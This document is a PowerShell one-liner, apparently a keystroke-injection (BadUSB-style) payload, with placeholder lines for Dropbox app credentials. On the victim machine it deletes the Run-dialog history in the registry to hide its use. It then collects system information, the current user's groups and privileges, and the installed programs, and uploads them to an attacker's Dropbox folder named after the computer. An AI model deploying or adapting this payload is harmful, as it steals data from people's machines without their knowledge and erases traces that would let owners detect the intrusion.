#Replace <APP_KEY> with the actual "App Key" of your app.
#Replace <APP_SECRET> with the actual "App Secret" of your app.
#Replace <REFRESH_TOKEN> with the actual "Refresh Token" of your app.


Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force; Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method POST -Headers @{"Authorization" = "Bearer $((Invoke-RestMethod -Uri "https://api.dropboxapi.com/oauth2/token" -Method POST -Headers @{"Content-Type" = "application/x-www-form-urlencoded"} -Body @{grant_type = "refresh_token"; refresh_token = "<REFRESH_TOKEN>"; client_id = "<APP_KEY>"; client_secret = "<APP_SECRET>"}).access_token)"; "Content-Type" = "application/octet-stream"; "Dropbox-API-Arg" = '{ "path": "/reports/' + $env:computername + '.txt", "mode": "add", "autorename": true, "mute": false }'} -Body "# System Information #`n $(SYSTEMINFO | Out-String) `n# User Information #`n $(WHOAMI /ALL | Out-String) `n# Installed Programs #`n $(Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*' | Select-Object DisplayName, DisplayVersion, Publisher | Out-String)" | Out-Null
